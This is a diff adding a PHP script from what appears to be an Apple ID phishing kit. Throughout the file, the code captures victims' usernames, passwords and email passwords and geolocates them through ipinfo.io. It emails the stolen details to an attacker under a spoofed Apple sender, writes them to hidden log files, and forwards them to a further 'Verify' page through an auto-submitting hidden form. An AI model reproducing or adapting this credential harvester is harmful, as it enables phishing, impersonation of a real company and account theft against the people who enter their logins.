@@ -1,0 +1,65 @@
+<?php
+$rand = rand(999999,9999999);
+error_reporting(0);
+include('../../result/detect.php');
+require "session_protect.php";
+require "functions.php";
+$_SESSION['user'] = $_POST['user']; 
+$_SESSION['pass'] = $_POST['pass'];
+if ($_POST['epass'] == '') {
+    $_SESSION['epass'] = '-';
+} else {
+
+$_SESSION['epass'] = $_POST['epass']; }
+
+include('../../result/curl.php');
+
+$systemInfo = systeminfo($ip);
+
+$nggon = curl("https://ipinfo.io/".$ip."/json");
+$lokasi = json_decode($nggon);
+$VictimInfo1 = ""."".$_SERVER['REMOTE_ADDR']." - [".$lokasi->org."]";
+$VictimInfo2 = ""."".$lokasi->city.", ".$lokasi->region.", ".$lokasi->country."";
+$VictimInfo4 = ""."".$os;
+$VictimInfo5 = ""."".$systemInfo['useragent'];
+
+include '../../result/res_login.php';
+include '../../config.php';
+$subject = "Login Info [ " . $nama_negara . " - " . $ip . " ]";
+$headers = "From: Apple ID <".$SenderEmail.">\r\n";
+$headers .= "Content-Type: text/html\r\n";
+if ($send_login == "hidup") {
+mail($Your_Email, $subject, $message, $headers); 
+$myfile = fopen("../../assets/logs/.login.txt", "a");
+$txt = $_POST['user']."|".$_SESSION['pass']."<br>\r\n";
+fputs($myfile, $txt);
+fclose($myfile);
+$myfile = fopen("../../assets/logs/.logine.txt", "a");
+$txt = $_POST['user']."|".$_SESSION['epass']."<br>\r\n";
+fputs($myfile, $txt);
+fclose($myfile);
+} else {
+$myfile = fopen("../../assets/logs/.login.txt", "a");
+$txt = $_POST['user']."|".$_SESSION['pass']."<br>\r\n";
+fputs($myfile, $txt);
+fclose($myfile);
+$myfile = fopen("../../assets/logs/.logine.txt", "a");
+$txt = $_POST['user']."|".$_SESSION['epass']."<br>\r\n";
+fputs($myfile, $txt);
+fclose($myfile);
+};
+
+$file2 = $_SERVER['DOCUMENT_ROOT'] . "/assets/logs/._login_.txt";
+$isi = @file_get_contents($file2);
+$buka = fopen($file2, "w");
+fwrite($buka, $isi + 1);
+
+?>
+<form action='../../Verify.php?<?php echo $_SESSION['user'];?>&Account-Unlock&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' name='frm'>
+<input type="hidden" name="user" value="<?php echo $_SESSION['user'];?>">
+<input type="hidden" name="pass" value="<?php echo $_SESSION['pass'];?>">
+<input type="hidden" name="epass" value="<?php echo $_SESSION['epass'];?>">
+</form>
+<script language="JavaScript">
+document.frm.submit();
+</script>
